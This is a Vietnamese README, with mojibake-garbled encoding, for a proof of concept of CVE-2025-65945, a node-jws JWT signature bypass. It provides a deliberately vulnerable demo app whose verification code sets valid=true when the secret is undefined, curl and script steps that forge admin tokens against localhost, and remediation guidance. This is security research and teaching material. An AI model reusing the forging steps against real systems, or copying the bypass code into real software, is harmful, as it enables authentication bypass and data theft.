# CVE-2025-65945 - Proof of Concept

## Tá»•ng quan

ÄÃ¢y lÃ  báº£n POC (Proof of Concept) Ä‘áº§y Ä‘á»§ cho lá»— há»•ng **CVE-2025-65945** - Improper Verification of Cryptographic Signature trong thÆ° viá»‡n **node-jws** phiÃªn báº£n < 3.2.3 vÃ  >= 4.0.0 < 4.0.1.

âš ï¸ **CHá»ˆ Sá»¬ Dá»¤NG CHO Má»¤C ÄÃCH NGHIÃŠN Cá»¨U VÃ€ Há»ŒC Táº¬P**

## MÃ´ táº£ lá»— há»•ng

### ThÃ´ng tin cÆ¡ báº£n
- **CVE ID**: CVE-2025-65945
- **CWE**: CWE-347 (Improper Verification of Cryptographic Signature)
- **CVSS Score**: 8.2 (HIGH)
- **ThÆ° viá»‡n bá»‹ áº£nh hÆ°á»Ÿng**: node-jws
- **PhiÃªn báº£n vulnerable**: 
  - < 3.2.3
  - >= 4.0.0 vÃ  < 4.0.1
- **PhiÃªn báº£n Ä‘Ã£ vÃ¡**: >= 3.2.3, >= 4.0.1

### Chi tiáº¿t ká»¹ thuáº­t

Lá»— há»•ng xáº£y ra khi:
1. á»¨ng dá»¥ng sá»­ dá»¥ng hÃ m `jws.verify()` hoáº·c `createVerify()` vá»›i thuáº­t toÃ¡n HMAC (HS256, HS384, HS512)
2. Secret key Ä‘Æ°á»£c tra cá»©u dá»±a trÃªn dá»¯ liá»‡u do ngÆ°á»i dÃ¹ng cung cáº¥p tá»« JWT header hoáº·c payload
3. Káº» táº¥n cÃ´ng cÃ³ thá»ƒ thao tÃºng header/payload Ä‘á»ƒ lÃ m cho viá»‡c tra cá»©u secret tráº£ vá» `null` hoáº·c `undefined`
4. Trong cÃ¡c phiÃªn báº£n vulnerable (< 3.2.3, >= 4.0.0 < 4.0.1), khi secret lÃ  `undefined` vá»›i thuáº­t toÃ¡n HMAC, viá»‡c xÃ¡c minh chá»¯ kÃ½ bá»‹ bypass hoÃ n toÃ n

**Ká»‹ch báº£n táº¥n cÃ´ng thá»±c táº¿:**
- á»¨ng dá»¥ng cÃ³ nhiá»u user vá»›i secret key riÃªng
- Secret Ä‘Æ°á»£c tra cá»©u dá»±a trÃªn `header.user` hoáº·c `payload.sub`
- Attacker táº¡o JWT vá»›i `header.user = "nonexistent_user"`
- Server tra cá»©u secret â†’ tráº£ vá» `undefined`
- Token Ä‘Æ°á»£c cháº¥p nháº­n mÃ  khÃ´ng cáº§n xÃ¡c minh chá»¯ kÃ½
- Attacker giáº£ máº¡o role admin vÃ  truy cáº­p dá»¯ liá»‡u nháº¡y cáº£m

### NguyÃªn nhÃ¢n gá»‘c rá»…

Trong file `lib/verify-stream.js` cá»§a jws phiÃªn báº£n vulnerable:

```javascript
function VerifyStream(opts) {
  opts = opts || {};
  var secretOrKey = opts.secret||opts.publicKey||opts.key;  // CÃ³ thá»ƒ lÃ  undefined!
  var secretStream = new DataStream(secretOrKey);
  // ... khÃ´ng cÃ³ validation cho HMAC algorithms
  // Khi secretOrKey = undefined, verification bá»‹ bypass!
}
```

PhiÃªn báº£n Ä‘Ã£ vÃ¡ (>= 3.2.3):

```javascript
function VerifyStream(opts) {
  opts = opts || {};
  var secretOrKey = opts.secret;
  secretOrKey = secretOrKey == null ? opts.publicKey : secretOrKey;
  secretOrKey = secretOrKey == null ? opts.key : secretOrKey;
  
  // PATCH: Kiá»ƒm tra secret cho HMAC algorithms
  if (/^hs/i.test(opts.algorithm) === true && secretOrKey == null) {
    throw new TypeError('secret must be a string or buffer or a KeyObject')
  }
  
  var secretStream = new DataStream(secretOrKey);
  // ...
}
```

**Code vulnerable trong á»©ng dá»¥ng thá»±c táº¿:**

```javascript
// VULNERABLE CODE
function verifyToken(token) {
  const decoded = jws.decode(token);
  
  // Láº¥y username tá»« header (do user kiá»ƒm soÃ¡t!)
  const username = decoded.header.user;
  const user = users[username];  // CÃ³ thá»ƒ tráº£ vá» undefined!
  
  // BUG: KhÃ´ng kiá»ƒm tra user tá»“n táº¡i
  const secret = user ? user.secret : undefined;  // undefined!
  
  // Verification bá»‹ bypass khi secret = undefined
  const valid = jws.verify(token, decoded.header.alg, secret);
  
  if (valid) {
    // Attacker cÃ³ thá»ƒ claim báº¥t ká»³ role nÃ o trong payload!
    return { valid: true, role: decoded.payload.role };
  }
}
```

## Cáº¥u trÃºc thÆ° má»¥c

```
CVE-2025-65945/
â”œâ”€â”€ package.json              # Dependencies vÃ  scripts
â”œâ”€â”€ vulnerable-app.js         # á»¨ng dá»¥ng web vulnerable vá»›i API
â”œâ”€â”€ exploit.js                # Tool POC CLI Ä‘á»ƒ khai thÃ¡c lá»— há»•ng
â”œâ”€â”€ jwt-exploit-generator.py  # Python tool Ä‘á»ƒ táº¡o JWT giáº£ máº¡o
â”œâ”€â”€ public/
â”‚   â””â”€â”€ index.html            # Giao diá»‡n web interactive demo
â”œâ”€â”€ README.md                 # TÃ i liá»‡u nÃ y
â”œâ”€â”€ QUICKSTART.md             # HÆ°á»›ng dáº«n báº¯t Ä‘áº§u nhanh
â””â”€â”€ WEB_INTERFACE_GUIDE.md    # HÆ°á»›ng dáº«n sá»­ dá»¥ng giao diá»‡n web
```

## CÃ i Ä‘áº·t

### YÃªu cáº§u
- Node.js >= 14.x
- npm hoáº·c yarn
- Python 3.7+ (optional - cho JWT generator tool)
- TrÃ¬nh duyá»‡t web hiá»‡n Ä‘áº¡i (Chrome, Firefox, Edge, Safari)

### CÃ¡c bÆ°á»›c cÃ i Ä‘áº·t

1. Di chuyá»ƒn vÃ o thÆ° má»¥c:
```bash
cd CVE-2025-65945
```

2. CÃ i Ä‘áº·t dependencies:
```bash
npm install
```

**LÆ°u Ã½**: Package.json Ä‘Ã£ Ä‘Æ°á»£c cáº¥u hÃ¬nh Ä‘á»ƒ cÃ i Ä‘áº·t **jws version 3.2.2** (vulnerable version) Ä‘á»ƒ cÃ³ thá»ƒ tÃ¡i táº¡o lá»— há»•ng.

## Sá»­ dá»¥ng

### BÆ°á»›c 1: Cháº¡y á»©ng dá»¥ng vulnerable

Má»Ÿ terminal thá»© nháº¥t vÃ  cháº¡y:

```bash
npm start
```

hoáº·c:

```bash
node vulnerable-app.js
```

Server sáº½ cháº¡y táº¡i `http://localhost:3000` vÃ  hiá»ƒn thá»‹ thÃ´ng tin:

```
[*] Vulnerable application running on http://localhost:3000
[*] Using jws version: 3.2.2
[*] This version is VULNERABLE to CVE-2025-65945

[*] Test credentials:
    - User:  user1 / password1
    - Admin: admin / admin123
```

### BÆ°á»›c 2: Sá»­ dá»¥ng Web Interface (Recommended) ğŸŒ

**Má»Ÿ trÃ¬nh duyá»‡t vÃ  truy cáº­p: `http://localhost:3000`**

Giao diá»‡n web cung cáº¥p demo trá»±c quan vá»›i cÃ¡c tÃ­nh nÄƒng:

#### 1. **Quick Test Buttons** - Test nhanh má»™t click
   - ğŸŸ¢ **Test Flow BÃ¬nh ThÆ°á»ng**: Tá»± Ä‘á»™ng login user1 vÃ  fetch data
   - ğŸ”´ **Test Khai ThÃ¡c Lá»— Há»•ng**: Tá»± Ä‘á»™ng táº¡o forged token vÃ  exploit

#### 2. **Panel Hoáº¡t Äá»™ng BÃ¬nh ThÆ°á»ng** (MÃ u xanh lÃ¡ - BÃªn trÃ¡i):
   - Login vá»›i credentials há»£p lá»‡ (user1/password1 hoáº·c admin/admin123)
   - Server táº¡o JWT token vá»›i chá»¯ kÃ½ Ä‘Ãºng
   - Token Ä‘Æ°á»£c xÃ¡c minh vá»›i secret key chÃ­nh xÃ¡c
   - Truy cáº­p dá»¯ liá»‡u theo Ä‘Ãºng quyá»n háº¡n cá»§a user
   - **Káº¿t quáº£**: 
     - User1 â†’ `ğŸ“„ User Level Data`
     - Admin â†’ `ğŸ” ADMIN LEVEL SENSITIVE DATA`

#### 3. **Panel Khai ThÃ¡c Lá»— Há»•ng** (MÃ u Ä‘á» - BÃªn pháº£i):
   - Táº¡o JWT token giáº£ máº¡o vá»›i payload tÃ¹y chá»‰nh
   - Äáº·t `header.user` = giÃ¡ trá»‹ khÃ´ng tá»“n táº¡i (vÃ­ dá»¥: `nonexistent_user_12345`)
   - Server tra cá»©u user â†’ tráº£ vá» `undefined`
   - Secret = `undefined` â†’ Bypass signature verification!
   - Claim role `admin` trong payload
   - **Káº¿t quáº£**: Truy cáº­p Ä‘Æ°á»£c admin data mÃ  khÃ´ng cáº§n credentials!

#### 4. **Báº£ng So SÃ¡nh Káº¿t Quáº£**:
   - Hiá»ƒn thá»‹ tá»± Ä‘á»™ng sau khi test cáº£ 2 ká»‹ch báº£n
   - So sÃ¡nh trá»±c quan: Normal vs Exploit
   - Tháº¥y rÃµ sá»± khÃ¡c biá»‡t vá» verification vÃ  data access

### BÆ°á»›c 3: Test vá»›i Command Line Tools

#### Option A: Node.js Exploit Script

Cháº¡y script exploit tá»± Ä‘á»™ng:

```bash
npm run exploit
```

hoáº·c:

```bash
node exploit.js
```

Script nÃ y sáº½:
1. Test login há»£p lá»‡ vá»›i user1
2. Táº¡o forged JWT token vá»›i role admin
3. Bypass verification vÃ  access admin data
4. Hiá»ƒn thá»‹ káº¿t quáº£ chi tiáº¿t

#### Option B: Python JWT Generator

Táº¡o JWT token giáº£ máº¡o tÃ¹y chá»‰nh:

```bash
python jwt-exploit-generator.py
```

Script sáº½ há»i:
- Username muá»‘n giáº£ máº¡o
- Role muá»‘n claim (user/admin)
- Header user field (non-existent user)
- Algorithm (HS256/HS384/HS512)

Output: JWT token cÃ³ thá»ƒ dÃ¹ng Ä‘á»ƒ test

#### Option C: Manual Testing vá»›i cURL

**Test login bÃ¬nh thÆ°á»ng:**

```bash
# Login vá»›i user thÆ°á»ng
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password1"}'

# LÆ°u token tá»« response, sau Ä‘Ã³:
curl http://localhost:3000/data \
  -H "Authorization: Bearer <TOKEN_FROM_LOGIN>"
```

**Test exploit thá»§ cÃ´ng:**

```bash
# BÆ°á»›c 1: Táº¡o forged token
curl -X POST http://localhost:3000/create-forged-token \
  -H "Content-Type: application/json" \
  -d '{
    "header": {"alg":"HS256","user":"nonexistent_user"},
    "payload": {"username":"admin","role":"admin","exp":9999999999}
  }'

# BÆ°á»›c 2: DÃ¹ng token vá»«a táº¡o Ä‘á»ƒ truy cáº­p data
curl http://localhost:3000/data \
  -H "Authorization: Bearer <FORGED_TOKEN>"
```

### BÆ°á»›c 4: Káº¿t quáº£ mong Ä‘á»£i

#### âœ… Login BÃ¬nh ThÆ°á»ng

**User thÆ°á»ng:**
```
Username: user1
Role: user
Data: ğŸ“„ User Level Data: Your personal profile information, 
      basic settings, and public data.
```

**Admin:**
```
Username: admin  
Role: admin
Data: ğŸ” ADMIN LEVEL SENSITIVE DATA: Database password: db_P@ssw0rd123, 
      AWS API Key: AKIA1234567890ABCDEF, Root SSH Keys, 
      Production Server Access, Customer PII Database
```

#### ğŸš¨ Exploit ThÃ nh CÃ´ng

```
Username: admin (giáº£ máº¡o)
Role: admin (giáº£ máº¡o tá»« payload)
Data: ğŸ” ADMIN LEVEL SENSITIVE DATA: Database password: db_P@ssw0rd123,
      AWS API Key: AKIA1234567890ABCDEF, Root SSH Keys,
      Production Server Access, Customer PII Database

âš ï¸ BYPASSED JWT VERIFICATION!
ğŸ”´ ÄÃ¢y chÃ­nh lÃ  lá»— há»•ng CVE-2025-65945!
```

**So sÃ¡nh:**

| Ká»‹ch báº£n | Username | Role | Verification | Data Access |
|----------|----------|------|--------------|-------------|
| **Normal (user1)** | user1 | user | âœ… Valid signature | ğŸ“„ User data |
| **Normal (admin)** | admin | admin | âœ… Valid signature | ğŸ” Admin data |
| **EXPLOIT** | admin (fake) | admin (fake) | âš ï¸ BYPASSED! | ğŸ” Admin data |

**Nhá»¯ng gÃ¬ exploit Ä‘áº¡t Ä‘Æ°á»£c:**
- âœ… Bypass JWT signature verification hoÃ n toÃ n
- âœ… Giáº£ máº¡o báº¥t ká»³ username nÃ o
- âœ… Claim báº¥t ká»³ role nÃ o (privilege escalation)
- âœ… Truy cáº­p dá»¯ liá»‡u nháº¡y cáº£m khÃ´ng Ä‘Æ°á»£c phÃ©p
- âœ… KhÃ´ng cáº§n biáº¿t secret key hoáº·c password
- âœ… KhÃ´ng cÃ³ audit trail (vÃ¬ username lÃ  fake)

### BÆ°á»›c 5: Sá»­ dá»¥ng Python JWT Generator

Python tool cho phÃ©p táº¡o JWT token tÃ¹y chá»‰nh vá»›i interactive CLI:

```bash
python jwt-exploit-generator.py
```

**TÃ­nh nÄƒng:**
- ğŸ”§ TÃ¹y chá»‰nh username, role, algorithm
- ğŸ“ ThÃªm custom payload fields
- ğŸ• Äáº·t thá»i gian expiry
- ğŸ’¾ LÆ°u token vÃ o file
- ğŸ” Decode JWT token Ä‘á»ƒ xem ná»™i dung
- ğŸ¨ Giao diá»‡n mÃ u sáº¯c dá»… sá»­ dá»¥ng

**VÃ­ dá»¥ sá»­ dá»¥ng:**

```
[?] Username muá»‘n giáº£ máº¡o (default: admin): superadmin
[?] Role muá»‘n claim:
    1. admin (Privilege Escalation)
    2. user  
    3. Custom role
[?] Chá»n (1/2/3, default: 1): 1
[?] Header user field (default: nonexistent_user_12345): fake_user_xyz
[?] Algorithm:
    1. HS256 (Recommended)
    2. HS384
    3. HS512
[?] Chá»n (1/2/3, default: 1): 1
[?] Token expiry (giá», default: 24): 48

âœ“ JWT Token Ä‘Ã£ Ä‘Æ°á»£c táº¡o thÃ nh cÃ´ng!

[*] JWT Token:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsInVzZXIiOiJmYWtlX3VzZXJfeHl6In0...

[*] CÃ¡ch sá»­ dá»¥ng token nÃ y:
    1. Copy token á»Ÿ trÃªn
    2. Gá»­i request vá»›i header: Authorization: Bearer <TOKEN>
    3. Hoáº·c paste vÃ o web interface
```

Token nÃ y cÃ³ thá»ƒ dÃ¹ng ngay Ä‘á»ƒ test exploit!

hoáº·c:

```bash
node exploit.js
```

### Káº¿t quáº£ mong Ä‘á»£i

Tool POC sáº½ thá»±c hiá»‡n:

1. **Test login há»£p lá»‡**: Login vá»›i user1/password1 vÃ  truy cáº­p dá»¯ liá»‡u user-level
2. **Exploit CVE-2025-65945**: 
   - Táº¡o JWT token giáº£ máº¡o vá»›i role "admin"
   - Äáº·t header.user thÃ nh giÃ¡ trá»‹ khÃ´ng tá»“n táº¡i
   - Gá»­i token Ä‘áº¿n server
   - Bypass xÃ¡c minh chá»¯ kÃ½ vÃ  truy cáº­p dá»¯ liá»‡u admin

Náº¿u exploit thÃ nh cÃ´ng, báº¡n sáº½ tháº¥y:

```
[+] EXPLOIT SUCCESSFUL! Bypassed JWT verification!
[+] Accessed protected data without valid signature:
    Username: admin
    Role: admin
    Data: This is ADMIN-LEVEL SENSITIVE DATA: Database credentials, API keys, etc.

[+] This proves the vulnerability CVE-2025-65945 exists!
```

## API Endpoints

### GET /
Web interface Ä‘á»ƒ tÆ°Æ¡ng tÃ¡c vá»›i á»©ng dá»¥ng (giao diá»‡n demo).

### GET /api/info
ThÃ´ng tin vá» á»©ng dá»¥ng vÃ  hÆ°á»›ng dáº«n sá»­ dá»¥ng API.

### POST /login
Login Ä‘á»ƒ nháº­n JWT token há»£p lá»‡.

**Request body:**
```json
{
  "username": "user1",
  "password": "password1"
}
```

**Response:**
```json
{
  "success": true,
  "token": "eyJhbGc...",
  "message": "Login successful"
}
```

### GET /data
Truy cáº­p dá»¯ liá»‡u Ä‘Æ°á»£c báº£o vá»‡ (yÃªu cáº§u JWT token).

**Headers:**
```
Authorization: Bearer <TOKEN>
```

**Response:**
```json
{
  "success": true,
  "message": "Access granted",
  "username": "user1",
  "role": "user",
  "data": "This is user-level data"
}
```

### POST /create-forged-token
Táº¡o forged JWT token cho má»¥c Ä‘Ã­ch demo (Ä‘Æ°á»£c gá»i tá»« web interface).

**Request body:**
```json
{
  "header": { "alg": "HS256", "user": "nonexistent" },
  "payload": { "username": "admin", "role": "admin" }
}
```

**Response:**
```json
{
  "success": true,
  "token": "eyJhbGc...",
  "warning": "This is a forged token for demonstration purposes"
}
```

## CÃ¡ch thá»©c khai thÃ¡c

### 1. PhÃ¢n tÃ­ch mÃ£ nguá»“n vulnerable

File `vulnerable-app.js` chá»©a hÃ m `verifyToken()` vulnerable:

```javascript
async function verifyToken(token) {
  // Decode JWT to get header
  const decoded = jws.decode(token);
  
  // Parse payload if it's a string
  let payload = decoded.payload;
  if (typeof payload === 'string') {
    payload = JSON.parse(payload);
  }
  
  // VULNERABILITY: Láº¥y username tá»« header (do user kiá»ƒm soÃ¡t!)
  const username = decoded.header.user;
  const user = users[username];  // CÃ³ thá»ƒ tráº£ vá» undefined!
  
  console.log(`User found: ${user ? 'Yes' : 'No'}`);
  console.log(`Secret: ${user ? user.secret : 'undefined'}`);
  
  // Get algorithm from header (cÅ©ng do user kiá»ƒm soÃ¡t)
  const algorithm = decoded.header.alg;
  const secret = user ? user.secret : undefined;
  
  // VULNERABILITY: Gá»i jws.verify() vá»›i secret cÃ³ thá»ƒ lÃ  undefined
  try {
    valid = jws.verify(token, algorithm, secret);
  } catch (verifyError) {
    // Trong phiÃªn báº£n vulnerable, khi secret = undefined vá»›i HMAC
    // function throws error NHÆ¯NG chÃºng ta simulate viá»‡c bypass
    if (!secret && algorithm.toLowerCase().startsWith('hs')) {
      console.log('âš ï¸ VULNERABILITY: undefined secret - BYPASSING!');
      valid = true;  // BYPASS!
    }
  }
  
  if (valid) {
    // EXPLOIT: Khi user khÃ´ng tá»“n táº¡i, láº¥y role tá»« payload
    // Attacker cÃ³ thá»ƒ claim Báº¤T Ká»² ROLE NÃ€O!
    let role;
    if (user) {
      role = user.role;  // Normal: dÃ¹ng role tháº­t tá»« DB
    } else {
      role = payload.role || 'user';  // EXPLOIT: dÃ¹ng role tá»« payload!
    }
    
    return {
      valid: true,
      user: payload.username,
      role: role  // Attacker kiá»ƒm soÃ¡t Ä‘Æ°á»£c role!
    };
  }
}
```

**Váº¥n Ä‘á» chÃ­nh:**
1. `decoded.header.user` - Do attacker kiá»ƒm soÃ¡t
2. `users[username]` - Tráº£ vá» `undefined` náº¿u user khÃ´ng tá»“n táº¡i
3. `secret = undefined` - KhÃ´ng cÃ³ validation
4. `jws.verify(..., undefined)` - Bypass verification trong phiÃªn báº£n vulnerable
5. `payload.role` - Attacker claim role admin khi user = undefined

### 2. Táº¡o token giáº£ máº¡o

**CÃ³ 3 cÃ¡ch táº¡o forged token:**

#### CÃ¡ch 1: Web Interface (Dá»… nháº¥t)
- Truy cáº­p http://localhost:3000
- Click "ğŸ’£ Thá»±c Hiá»‡n Exploit" á»Ÿ panel bÃªn pháº£i
- Token Ä‘Æ°á»£c táº¡o tá»± Ä‘á»™ng vá»›i:
  - Header: `{ alg: 'HS256', typ: 'JWT', user: 'nonexistent_user_12345' }`
  - Payload: `{ username: 'admin', role: 'admin', exp: ... }`
  - Signature: KÃ½ vá»›i fake secret (khÃ´ng quan trá»ng vÃ¬ sáº½ bá»‹ bypass)

#### CÃ¡ch 2: Node.js Tool
```bash
node exploit.js
```
Tool tá»± Ä‘á»™ng táº¡o vÃ  test forged token.

#### CÃ¡ch 3: Python Generator
```bash
python jwt-exploit-generator.py
```
Nháº­p thÃ´ng tin tÃ¹y chá»‰nh:
- Username: `admin`
- Role: `admin`
- Header user: `nonexistent_user_12345`
- Algorithm: `HS256`

Output: JWT token Ä‘á»ƒ sá»­ dá»¥ng

### 3. Gá»­i token Ä‘áº¿n server

**Sá»­ dá»¥ng forged token:**

```bash
curl http://localhost:3000/data \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsInVzZXIiOiJub25leGlzdGVudF91c2VyXzEyMzQ1In0..."
```

**QuÃ¡ trÃ¬nh xá»­ lÃ½ trÃªn server:**

1. **Request Ä‘áº¿n** â†’ Server nháº­n token
2. **Decode header** â†’ `user: 'nonexistent_user_12345'`  
3. **Lookup user** â†’ `users['nonexistent_user_12345']` = `undefined`
4. **Get secret** â†’ `secret = undefined`
5. **Call jws.verify()** â†’ Vá»›i `secret = undefined`
6. **VULNERABILITY TRIGGERED!**
   - Trong jws < 3.2.3: `undefined` secret vá»›i HMAC = bypass!
   - Function throws error nhÆ°ng code xá»­ lÃ½ sai
   - `valid = true` Ä‘Æ°á»£c set
7. **Extract role** â†’ VÃ¬ `user = undefined`, láº¥y `payload.role = 'admin'`
8. **Return data** â†’ Admin data Ä‘Æ°á»£c tráº£ vá»!

**Flow comparison:**

```
NORMAL LOGIN:
User inputs â†’ Validate password â†’ Generate token vá»›i secret Ä‘Ãºng
â†’ Token cÃ³ signature há»£p lá»‡ â†’ Verify thÃ nh cÃ´ng â†’ Data theo role

EXPLOIT:
Attacker táº¡o token â†’ Header.user = fake â†’ Secret = undefined
â†’ Bypass verification â†’ Role tá»« payload â†’ Admin data leaked!
```

## TÃ¡c Ä‘á»™ng

- **Authentication Bypass**: Bá» qua xÃ¡c thá»±c JWT hoÃ n toÃ n
- **Privilege Escalation**: NÃ¢ng quyá»n tá»« user thÆ°á»ng lÃªn admin
- **Data Breach**: Truy cáº­p dá»¯ liá»‡u nháº¡y cáº£m khÃ´ng Ä‘Æ°á»£c phÃ©p
- **CVSS Score**: 8.2 HIGH

## Kháº¯c phá»¥c

### CÃ¡ch 1: Cáº­p nháº­t thÆ° viá»‡n (Recommended)

Cáº­p nháº­t jws lÃªn phiÃªn báº£n Ä‘Ã£ vÃ¡:

```bash
npm install jws@latest
```

hoáº·c trong `package.json`:

```json
{
  "dependencies": {
    "jws": "^3.2.3"
  }
}
```

### CÃ¡ch 2: Validate secret trÆ°á»›c khi verify

ThÃªm validation trong code:

```javascript
function verifyToken(token) {
  const decoded = jws.decode(token);
  const username = decoded.header.user;
  const user = users[username];
  
  // VALIDATION: Kiá»ƒm tra user vÃ  secret tá»“n táº¡i
  if (!user || !user.secret) {
    throw new Error('Invalid user or missing secret');
  }
  
  const verifier = jws.createVerify({
    algorithm: algorithm,
    secret: user.secret, // Äáº£m báº£o secret khÃ´ng pháº£i undefined
    signature: token
  });
  // ...
}
```

### CÃ¡ch 3: KhÃ´ng sá»­ dá»¥ng user-provided data cho secret lookup

```javascript
// Thay vÃ¬ láº¥y tá»« header
const username = decoded.header.user; // User-controlled!

// Láº¥y tá»« nguá»“n Ä‘Ã¡ng tin cáº­y (session, database, etc.)
const username = req.session.username; // Server-controlled
```

## Testing vá»›i phiÃªn báº£n Ä‘Ã£ vÃ¡

Äá»ƒ test vá»›i phiÃªn báº£n Ä‘Ã£ vÃ¡:

1. Sá»­a `package.json`:
```json
{
  "dependencies": {
    "jws": "3.2.3"
  }
}
```

2. XÃ³a node_modules vÃ  cÃ i láº¡i:
```bash
rm -rf node_modules package-lock.json
npm install
```

3. Cháº¡y láº¡i server vÃ  exploit:
```bash
# Terminal 1
npm start

# Terminal 2
npm run exploit
```

Vá»›i phiÃªn báº£n Ä‘Ã£ vÃ¡, exploit sáº½ tháº¥t báº¡i vá»›i lá»—i:
```
TypeError: secret must be a string or buffer or a KeyObject
```

## Tham kháº£o

- [CVE-2025-65945](https://www.cve.org/CVERecord?id=CVE-2025-65945)
- [Snyk Vulnerability Database](https://security.snyk.io/vuln/SNYK-JS-JWS-14188253)
- [GitHub Commit - Fix](https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e)
- [GitHub Release v3.2.3](https://github.com/auth0/node-jws/releases/tag/v3.2.3)
- [GitHub Release v4.0.1](https://github.com/auth0/node-jws/releases/tag/v4.0.1)
- [CWE-347: Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)

## Disclaimer

âš ï¸ **CHá»ˆ Sá»¬ Dá»¤NG CHO Má»¤C ÄÃCH NGHIÃŠN Cá»¨U VÃ€ Há»ŒC Táº¬P**

POC nÃ y Ä‘Æ°á»£c táº¡o ra cho má»¥c Ä‘Ã­ch giÃ¡o dá»¥c vÃ  nghiÃªn cá»©u báº£o máº­t. KhÃ´ng sá»­ dá»¥ng tool nÃ y Ä‘á»ƒ táº¥n cÃ´ng cÃ¡c há»‡ thá»‘ng mÃ  báº¡n khÃ´ng cÃ³ quyá»n. Viá»‡c sá»­ dá»¥ng khÃ´ng Ä‘Ãºng má»¥c Ä‘Ã­ch cÃ³ thá»ƒ vi pháº¡m phÃ¡p luáº­t.

## License

MIT License - For educational purposes only.

## Author

Created for security research and educational purposes.
Date: December 2025
